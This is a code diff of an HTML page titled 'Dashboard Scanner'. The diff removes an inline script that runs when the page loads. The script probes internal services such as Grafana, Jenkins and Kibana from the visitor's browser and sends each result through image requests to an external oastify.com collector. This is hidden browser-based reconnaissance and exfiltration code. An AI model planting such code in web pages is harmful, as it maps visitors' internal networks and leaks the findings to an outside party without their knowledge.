@@ -2,35 +2,6 @@
 <html>
 <head>
   <title>Dashboard Scanner</title>
-  <script>
-    const targets = [
-      "https://grafana.local/",
-      "https://prometheus.local/",
-      "https://jenkins.local/",
-      "https://kibana.local/",
-      "https://sonarqube.local/",
-      "https://elasticsearch.local/"
-    ];
-    const timestamp = Date.now();
-
-    targets.forEach(url => {
-      fetch(url)
-        .then(res => {
-          const status = res.status;
-          const tag = (status === 404 || status === 400) ? "fail" : "hit";
-          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/" + tag +
-                            "?target=" + encodeURIComponent(url) +
-                            "&status=" + status +
-                            "&ts=" + timestamp;
-        })
-        .catch(() => {
-          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" +
-                            "?target=" + encodeURIComponent(url) +
-                            "&error=network" +
-                            "&ts=" + timestamp;
-        });
-    });
-  </script>
 </head>
 <body>
   <h1>Dashboard scan in progress 🚀</h1>
